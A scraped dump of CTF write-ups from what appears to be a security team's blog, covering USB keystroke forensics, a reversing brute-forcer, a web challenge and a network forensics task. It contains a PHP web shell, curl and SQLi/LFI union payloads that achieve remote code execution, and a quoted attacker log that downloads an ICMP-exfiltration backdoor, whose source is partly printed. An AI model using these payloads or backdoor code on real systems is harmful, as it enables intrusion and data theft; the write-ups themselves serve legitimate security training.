12482Welcome my secret service. Do you know the password?Input the password.TWCTF&#123;pwnable_warmup_I_did_it!&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x86","slug":"Pwn/x86","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/"},{"name":"Stack Issue","slug":"Pwn/x86/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x86/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"tokyoWesterns2017","slug":"tokyoWesterns2017","permalink":"https://teamrocketist.github.io/tags/tokyoWesterns2017/"}]},{"title":"[Forensics] Hackit 2017 - USB ducker","slug":"Forensics-Hackit-2017-USB-ducker","date":"2017-08-29T16:25:11.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/08/29/Forensics-Hackit-2017-USB-ducker/","link":"","permalink":"https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/","excerpt":"","text":"USB duckerforen100Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag{…} )Attachment: (none)Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3MHint: (none) PS: If you are here just for the script there’s a much better and more updated version at https://github.com/TeamRocketIst/ctf-usb-keyboard-parser Another USB pcap, after analysing it with wireshark we can see that we have two devices one is a keyboard(bInterfaceClass: HID: 0x3) and the other is a mouse(Unknown)… Mouse Keyboard We can clearly see we that HID: 0x3 is a keyboard by searching for strings in wireshark EDIT -&gt; Find Packet I actually tried to see what the hacker did with the mouse but didn’t found anything special just a straight line of clicks you could parse the mouse inputs with tshark like this for example:1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass!=3\" -Tfields -e usb.capdata &gt; mouse Moving on to the keyboard since the mouse didn’t got us anything special we just got the output from the keyboard1tshark -r task.pcap -Y \"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass==3\" -Tfields -e usb.capdata &gt; keyboard Now the tricky part here is, the hacker used the arrow keys! making it harder to make a script to spit out the keyboard inputs, well during the CTF I got frustrated, and choose to make it by hand by looking at the table on https://usb.org/sites/default/files/documents/hut1_12v2.pdf (table 12). The keyboard inputs can be read like this: 12345 |-&gt; The value of the keypressed you can &quot;decode&quot; this value from the table 12 above |02:00:20:00:00:00:00:00| |--&gt; This value is 02 when shift is pressed and 00 when it isn&apos;t When the CTF finished I ended up doing a script to do this (it’s not perfect there is alot of more things to consider). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/usr/bin/python # -*- coding: utf-8 -*-# better and more updated version at https://github.com/TeamRocketIst/ctf-usb-keyboard-parserKEY_CODES = &#123; 0x04:['a', 'A'], 0x05:['b', 'B'], 0x06:['c', 'C'], 0x07:['d', 'D'], 0x08:['e', 'E'], 0x09:['f', 'F'], 0x0A:['g', 'G'], 0x0B:['h', 'H'], 0x0C:['i', 'I'], 0x0D:['j', 'J'], 0x0E:['k', 'K'], 0x0F:['l', 'L'], 0x10:['m', 'M'], 0x11:['n', 'N'], 0x12:['o', 'O'], 0x13:['p', 'P'], 0x14:['q', 'Q'], 0x15:['r', 'R'], 0x16:['s', 'S'], 0x17:['t', 'T'], 0x18:['u', 'U'], 0x19:['v', 'V'], 0x1A:['w', 'W'], 0x1B:['x', 'X'], 0x1C:['y', 'Y'], 0x1D:['z', 'Z'], 0x1E:['1', '!'], 0x1F:['2', '@'], 0x20:['3', '#'], 0x21:['4', '$'], 0x22:['5', '%'], 0x23:['6', '^'], 0x24:['7', '&amp;'], 0x25:['8', '*'], 0x26:['9', '('], 0x27:['0', ')'], 0x28:['\\n','\\n'], 0x2C:[' ', ' '], 0x2D:['-', '_'], 0x2E:['=', '+'], 0x2F:['[', '&#123;'], 0x30:[']', '&#125;'], 0x32:['#','~'], 0x33:[';', ':'], 0x34:['\\'', '\"'], 0x36:[',', '&lt;'], 0x38:['/', '?'], 0x37:['.', '&gt;'], 0x2b:['\\t','\\t'], 0x4f:[u'→',u'→'], 0x50:[u'←',u'←'], 0x51:[u'↓',u'↓'], 0x52:[u'↑',u'↑']&#125; #tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txtdatas = open('keyboard').read().split('\\n')[:-1]cursor_x = 0cursor_y = 0offset_current_line = 0lines = ['','','','','']output = ''for data in datas: shift = int(data.split(':')[0], 16) / 2 key = int(data.split(':')[2], 16) if key == 0: continue if KEY_CODES[key][shift] == u'↑': lines[cursor_y] += output output = '' cursor_y -= 1 elif KEY_CODES[key][shift] == u'↓': lines[cursor_y] += output output = '' cursor_y += 1 elif KEY_CODES[key][shift] == u'→': cursor_x += 1 elif KEY_CODES[key][shift] == u'←': cursor_x -= 1 elif KEY_CODES[key][shift] == '\\n': lines[cursor_y] += output cursor_x = 0 cursor_y += 1 output = '' else: output += KEY_CODES[key][shift] cursor_x += 1print '\\n'.join(lines) Now running the script 123456teamrocketist@Debian ~/D/H/c/h/f/for100&gt; python key2.pyw&#123;w$ju&#125;,'pt]=j%;9+ps&amp;#,k#&gt;bn$:6pjim0&#123;u'h;fks!s-flag&#123;k3yb0ard_sn4ke_2.0&#125;b[[e[fu~7d[=&gt;*(0]'$1c$ce3'ci.[%=%&amp;k(lc*2y4!&#125;%qz3 The flag is flag{k3yb0ard_sn4ke_2.0}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"pcap","slug":"pcap","permalink":"https://teamrocketist.github.io/tags/pcap/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"tshark","slug":"tshark","permalink":"https://teamrocketist.github.io/tags/tshark/"},{"name":"keyboard","slug":"keyboard","permalink":"https://teamrocketist.github.io/tags/keyboard/"},{"name":"mouse","slug":"mouse","permalink":"https://teamrocketist.github.io/tags/mouse/"},{"name":"usb","slug":"usb","permalink":"https://teamrocketist.github.io/tags/usb/"}]},{"title":"[Reverse] Hackit 2017 - rev200","slug":"Reverse-Hackit-2017-rev200","date":"2017-08-27T22:21:35.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/08/27/Reverse-Hackit-2017-rev200/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/","excerpt":"","text":"rev200Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come on, come debug me! I’ll get your ass, you jerk! Oh, you IDA monkey! Fuck all you and your tools! Come on, you scum haxor, you try to reverse me? Come on, you asshole!!Attachment: (none)Webpage: https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexcHint: (none) When I looked up into this challenge I just checked the assembly code and found it way too easy for 200 points, but then I saw something weird I couldn’t start it for debugging and then I checked the file types: 12$ file rev200\\ \\(1\\).efi rev200 (1).efi: PE32+ executable (DLL) (EFI application) x86-64 (stripped to external PDB), for MS Windows Oh its a ddl, that’s why well I still found it way to easy for all this points specially because with IDA we can convert this beautiful assembly code(missing the code for algo function): Into this beautiful “pseudo c” code(press F5 in IDA), well it makes everything much easier even thought the assembly wasn’t that hard to reverse…. Here we have the pseudo c code for “main” function and “algo” function… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667__int64 __fastcall efi_main(__int64 a1, __int64 a2)&#123; UINTN v2; // rbx@3 char v4[48]; // [sp+20h] [bp-A0h]@1 __int16 v5; // [sp+48h] [bp-78h]@1 CHAR16 String[48]; // [sp+50h] [bp-70h]@1 int v7; // [sp+A0h] [bp-20h]@1 char v8; // [sp+B0h] [bp-10h]@4 int v9; // [sp+B8h] [bp-8h]@1 int i; // [sp+BCh] [bp-4h]@1 __int64 v11; // [sp+E8h] [bp+28h]@1 v11 = a2; InitializeLib(); memset(String, 0, 0x50ui64); v7 = 0; memset(v4, 0, 0x28ui64); v5 = 0; v9 = 0; Input(L\"Enter the flag: \", String, 42i64); for ( i = 0; ; ++i ) &#123; v2 = i; if ( v2 &gt;= StrLen(String) ) break; v4[i] = String[i]; &#125; algo((__int64)v4); (**(void (__fastcall ***)(_QWORD, _QWORD))(v11 + 48))(*(_QWORD *)(v11 + 48), 0i64); (*(void (__fastcall **)(signed __int64, signed __int64, char *))(*(_QWORD *)(v11 + 96) + 96i64))( 1i64, *(_QWORD *)(v11 + 48) + 16i64, &amp;v8); return 0i64;&#125;UINTN __fastcall algo(__int64 a1)&#123; UINTN result; // rax@17 int v2[40]; // [sp+20h] [bp-60h]@11 int v3[20]; // [sp+C0h] [bp+40h]@5 int v4[23]; // [sp+110h] [bp+90h]@2 int m; // [sp+16Ch] [bp+ECh]@13 int l; // [sp+170h] [bp+F0h]@10 int k; // [sp+174h] [bp+F4h]@7 int j; // [sp+178h] [bp+F8h]@4 int i; // [sp+17Ch] [bp+FCh]@1 for ( i = 0; i &lt;= 19; ++i ) v4[i] = *(_BYTE *)(i + a1); for ( j = 20; j &lt;= 39; ++j ) v3[j - 20] = *(_BYTE *)(j + a1); for ( k = 0; k &lt;= 19; ++k ) &#123; v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8; v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11; &#125; for ( l = 0; l &lt;= 19; ++l ) v2[l] = v4[l]; for ( m = 20; m &lt;= 39; ++m ) v2[m] = v3[m - 20]; if ( (unsigned int)memcmp((__int64)v2, (__int64)&amp;correct, 160) ) result = Print(L\"\\nWrong\\n\"); else result = Print(L\"\\nCorrect\\n\"); return result;&#125; By reading this c code above we can clearly understand what is going on. the program itself reads from the stdout the flag and then encrypts a bunch of bytes with some xor operations and other stupid simple manipulations, since we know the ciphertext (we can get it from IDA) just double click on “correct” symbol from the main function and you will see its value in the global variables: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161.data:0000000070946000 public correct.data:0000000070946000 correct db 68h ; h ; DATA XREF: algo+18E\u0018o.data:0000000070946001 db 0.data:0000000070946002 db 0.data:0000000070946003 db 0.data:0000000070946004 db 3Ch ; &lt;.data:0000000070946005 db 0.data:0000000070946006 db 0.data:0000000070946007 db 0.data:0000000070946008 db 79h ; y.data:0000000070946009 db 0.data:000000007094600A db 0.data:000000007094600B db 0.data:000000007094600C db 71h ; q.data:000000007094600D db 0.data:000000007094600E db 0.data:000000007094600F db 0.data:0000000070946010 db 63h ; c.data:0000000070946011 db 0.data:0000000070946012 db 0.data:0000000070946013 db 0.data:0000000070946014 db 7Ch ; |.data:0000000070946015 db 0.data:0000000070946016 db 0.data:0000000070946017 db 0.data:0000000070946018 db 81h ; ü.data:0000000070946019 db 0.data:000000007094601A db 0.data:000000007094601B db 0.data:000000007094601C db 92h ; Æ.data:000000007094601D db 0.data:000000007094601E db 0.data:000000007094601F db 0.data:0000000070946020 db 92h ; Æ.data:0000000070946021 db 0.data:0000000070946022 db 0.data:0000000070946023 db 0.data:0000000070946024 db 65h ; e.data:0000000070946025 db 0.data:0000000070946026 db 0.data:0000000070946027 db 0.data:0000000070946028 db 65h ; e.data:0000000070946029 db 0.data:000000007094602A db 0.data:000000007094602B db 0.data:000000007094602C db 93h ; ô.data:000000007094602D db 0.data:000000007094602E db 0.data:000000007094602F db 0.data:0000000070946030 db 92h ; Æ.data:0000000070946031 db 0.data:0000000070946032 db 0.data:0000000070946033 db 0.data:0000000070946034 db 49h ; I.data:0000000070946035 db 0.data:0000000070946036 db 0.data:0000000070946037 db 0.data:0000000070946038 db 79h ; y.data:0000000070946039 db 0.data:000000007094603A db 0.data:000000007094603B db 0.data:000000007094603C db 92h ; Æ.data:000000007094603D db 0.data:000000007094603E db 0.data:000000007094603F db 0.data:0000000070946040 db 38h ; 8.data:0000000070946041 db 0.data:0000000070946042 db 0.data:0000000070946043 db 0.data:0000000070946044 db 6Ch ; l.data:0000000070946045 db 0.data:0000000070946046 db 0.data:0000000070946047 db 0.data:0000000070946048 db 3Ch ; &lt;.data:0000000070946049 db 0.data:000000007094604A db 0.data:000000007094604B db 0.data:000000007094604C db 6Fh ; o.data:000000007094604D db 0.data:000000007094604E db 0.data:000000007094604F db 0.data:0000000070946050 db 7Bh ; &#123;.data:0000000070946051 db 0.data:0000000070946052 db 0.data:0000000070946053 db 0.data:0000000070946054 db 87h ; ç.data:0000000070946055 db 0.data:0000000070946056 db 0.data:0000000070946057 db 0.data:0000000070946058 db 58h ; X.data:0000000070946059 db 0.data:000000007094605A db 0.data:000000007094605B db 0.data:000000007094605C db 55h ; U.data:000000007094605D db 0.data:000000007094605E db 0.data:000000007094605F db 0.data:0000000070946060 db 89h ; ë.data:0000000070946061 db 0.data:0000000070946062 db 0.data:0000000070946063 db 0.data:0000000070946064 db 5Ah ; Z.data:0000000070946065 db 0.data:0000000070946066 db 0.data:0000000070946067 db 0.data:0000000070946068 db 59h ; Y.data:0000000070946069 db 0.data:000000007094606A db 0.data:000000007094606B db 0.data:000000007094606C db 7Eh ; ~.data:000000007094606D db 0.data:000000007094606E db 0.data:000000007094606F db 0.data:0000000070946070 db 7Eh ; ~.data:0000000070946071 db 0.data:0000000070946072 db 0.data:0000000070946073 db 0.data:0000000070946074 db 6Bh ; k.data:0000000070946075 db 0.data:0000000070946076 db 0.data:0000000070946077 db 0.data:0000000070946078 db 87h ; ç.data:0000000070946079 db 0.data:000000007094607A db 0.data:000000007094607B db 0.data:000000007094607C db 6Ch ; l.data:000000007094607D db 0.data:000000007094607E db 0.data:000000007094607F db 0.data:0000000070946080 db 57h ; W.data:0000000070946081 db 0.data:0000000070946082 db 0.data:0000000070946083 db 0.data:0000000070946084 db 6Ch ; l.data:0000000070946085 db 0.data:0000000070946086 db 0.data:0000000070946087 db 0.data:0000000070946088 db 6Bh ; k.data:0000000070946089 db 0.data:000000007094608A db 0.data:000000007094608B db 0.data:000000007094608C db 58h ; X.data:000000007094608D db 0.data:000000007094608E db 0.data:000000007094608F db 0.data:0000000070946090 db 59h ; Y.data:0000000070946091 db 0.data:0000000070946092 db 0.data:0000000070946093 db 0.data:0000000070946094 db 5Ah ; Z.data:0000000070946095 db 0.data:0000000070946096 db 0.data:0000000070946097 db 0.data:0000000070946098 db 5Ah ; Z.data:0000000070946099 db 0.data:000000007094609A db 0.data:000000007094609B db 0.data:000000007094609C db 6Fh ; o.data:000000007094609D db 0.data:000000007094609E db 0.data:000000007094609F db 0 Now parsing it with sublime-txt(very fast and easy to do it), than we put into a hex byte characters string in python… why not put the characters since ida actually shows some of them? Because this is a ciphertext and some characters may be unprintable or those which can be printed may require unicode and we all know how boring is to deal with unicode in python … so I always use hex bytes. 1correct = \"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\" Now I have an idea instead of trying to make a function that reverses those two functions why not bruteforce byte by byte, replicate the pseudo c code in python and when we get the final ciphertext equal to the “correct” variable we end the calculations and print the original string? seems like a cool plan! so we just rewrite that c code into python and then we add some loops to bruteforce the rest of the flag!!! We don’t even need to bruteforce from the range from 0x00 to the 0xff we can just use printable characters since the flag will only have those! and more we already have the beginning and the end of the flag which is “h4ck1t{“ and “}”. Here is the final payload:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from __future__ import print_functionimport difflibimport sysimport stringfrom difflib import Differcorrect = \"\\x68\\x3C\\x79\\x71\\x63\\x7C\\x81\\x92\\x92\\x65\\x65\\x93\\x92\\x49\\x79\\x92\\x38\\x6C\\x3C\\x6F\\x7B\\x87\\x58\\x55\\x89\\x5A\\x59\\x7E\\x7E\\x6B\\x87\\x6C\\x57\\x6C\\x6B\\x58\\x59\\x5A\\x5A\\x6F\"def algo(a1, offset): result = \"\" v2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v3 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] v4 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] for i in xrange(20): v4[i] = ord(a1[i]) for j in xrange(20,40): v3[j-20]= ord(a1[j]) for k in xrange(0,20): v4[k] = (((((v4[k] ^ 0xC) + 6) ^ 0xD) + 7) ^ 0xE) + 8 v3[k] = (((((v3[k] ^ 0xF) + 9) ^ 0x10) + 10) ^ 0x11) + 11 for l in xrange(0,20): v2[l] = v4[l] for m in xrange(20,40): v2[m] = v3[m-20] flag = ''.join([chr(x) for x in v2]) #print(flag) #print(correct) if(flag != correct): result = \"Wrong\" else: result = \"Correct\" return result, flag[offset] == correct[offset]def main(): v2 = 0 v4 = \"\" flag = \"\" # 0x20 v6 = '' v7 = 0 i = 0 result = 'Wrong' offset = 7 flag = \"h4ck1t&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;\" diff = False #print (string.printable) #exit(0) while result == 'Wrong': #print offset for y in string.printable: v4 = \"\" flag = [x for x in flag] #print offset flag[offset] = y #print('\\r'+''.join(flag),end='') i = 0 while True: v2 = i if (v2 &gt;= len(flag)): break v4 += flag[i] i +=1 #print (v4,offset) result, diff = algo(v4, offset) if result == 'Correct': break #print (diff,y) #print len(list(diff)) if diff: diff = False offset += 1 break print(''.join(flag), result)main() Easy isn’t it? running it we get the flag!: 12$ python rev200.pyh4ck1t&#123;ff77af3cf8d4e1e67c4300aeb5ba6344&#125; Correct","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"encryption","slug":"encryption","permalink":"https://teamrocketist.github.io/tags/encryption/"},{"name":"byte2byte","slug":"byte2byte","permalink":"https://teamrocketist.github.io/tags/byte2byte/"}]},{"title":"[Web] Hackit 2017 - V1rus3pidem1c 100","slug":"Web-Hackit-2017-V1rus3pidem1c-100","date":"2017-08-27T14:42:12.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","link":"","permalink":"https://teamrocketist.github.io/2017/08/27/Web-Hackit-2017-V1rus3pidem1c-100/","excerpt":"","text":"V1rus3pidem1cweb100Wasted16Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13372Hint: (none) After interacting a little bit with the page we can start taking some notes about the website:123GET parameter &quot;Country&quot; (Possible attacks like SQLi, LFI or even bash injection).File Upload form (By uploading a PHP Script). The uploaded files appear to be uploaded into uploads folder. Lets try uploading a php: 123&lt;?php&lt;pre&gt;if($_GET['cmd'])&#123;system($_GET['cmd']);&#125;&lt;/pre&gt;?&gt; Running some curl commands to check the status code of the file we are about to upload: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'404 We got a 404 (not found) which is normal we still didn’t upload our php file so lets do it: 12$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/index.php?country=Germany' -F \"fileToUpload=@/home/teamrocketist/D/H/dnjefwh43jfh342fnewjfjndewefnu27fd.php\"200 Nice we got an 200 (OK) response! lets see if see if this is good news: 12345678910$ curl --write-out '%&#123;http_code&#125;' --silent --output /dev/null 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'200$ curl 'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'&lt;pre&gt;&lt;?phpif($_GET['cmd']) &#123; system($_GET['cmd']); &#125;?&gt;&lt;/pre&gt; We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it. Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this. But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection? 12345678910111213141516171819202122232425262728293031323334353637$ sqlmap -u \"http://tasks.ctf.com.ua:13372/index.php?country=USA\" --tables --threads=10 --exclude-sysdbs --dump---Parameter: country (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa---[16:51:04] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL &gt;= 5.0.12Database: WHATAREYOUDOINGHERE[1 table]+-----------+| countries |+-----------+Database: WHATAREYOUDOINGHERETable: countries[10 entries]+-----------+----------------+--------------+| countryID | scriptPath | countryName |+-----------+----------------+--------------+| 1 | country/ge.php | Germany || 2 | country/tu.php | Turkmenistan || 3 | country/ne.php | Netherlands || 4 | country/se.php | Serbia || 5 | country/tk.php | Turkey || 6 | country/fr.php | France || 7 | country/uk.php | UK || 8 | country/ru.php | Russia || 9 | country/us.php | USA || 10 | country/ca.php | Canada |+-----------+----------------+--------------+ And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection! Getting the column number: 1234# successfully shows up a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 1-- qqq'# Doest show a upload form!$ curl 'http://tasks.ctf.com.ua:13372/index.php?country=Germany\\' order by 2-- qqq' Performing union injection and include /etc/passwd: Including our previous uploaded php script and and get remote code execution on the server! 123456789101112$ curl \"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ\"\"truncated html code\"total 72drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads-r--r--r-- 1 1002 1002 49 Aug 27 07:36 .htaccessdrwxrwxr-x 5 1002 1002 4096 Aug 25 20:26 .-r--r--r-- 1 1002 1002 44 Aug 25 20:26 iulersiueruigfuihseruhgi.phpdrwxrwxr-x 4 1002 1002 4096 Aug 25 13:59 ..-r--r--r-- 1 1002 1002 1667 Jul 28 20:54 index.phpdrwxrwxr-x 2 1002 1002 4096 Jul 28 03:35 countrydrwxrwxr-x 2 1002 1002 4096 Jul 28 03:34 static\"truncated html code\" The flag was in the php file iulersiueruigfuihseruhgi.php: 12345678$ curl 'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'\"truncated html code\"&lt;pre&gt;&lt;?php$flag=\"h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;\";?&gt;&lt;/pre&gt;\"truncated html code\"","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"}]},{"title":"[Network] Sha2017 - Abuse Mail [300]","slug":"Network-Sha2017-Abuse-Mail-300","date":"2017-08-07T12:52:21.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/08/07/Network-Sha2017-Abuse-Mail-300/","link":"","permalink":"https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/","excerpt":"","text":"Abuse Mail (300) - 62 solvesOur abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?abusemail.tgz233b7cb7f8113baca2f8d29d74105887 we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap. Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication. Let’s check telenet’s packages: Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -&gt; Preferences -&gt; Protocols -&gt; ESP After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to upload a backdoor on the server. the commands he used: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139GET /?ip=google.com HTTP/1.1PING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 msGET /?ip=google.com;ls HTTP/1.1ING google.com (172.217.17.110) 56(84) bytes of data.64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms--- google.com ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 3005msrtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 mscssindex.phpGET /?ip=;ls%20-la HTTP/1.1total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpGET /?ip=;sudo%20-l HTTP/1.1Matching Defaults entries for www-data on router: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on router: (ALL : ALL) NOPASSWD: ALLGET /?ip=;id HTTP/1.1uid=33(www-data) gid=33(www-data) groups=33(www-data)GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1--2017-07-26 09:43:36-- http://10.5.5.207/backdoor.pyConnecting to 10.5.5.207:80... connected.HTTP request sent, awaiting response... 200 OKLength: 2428 (2.4K) [text/x-python]Saving to: '/tmp/backdoor.py'0K .. 100% 458M=0s2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]GET /?ip=;cat /tmp/backdoor.py HTTP/1.1#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = 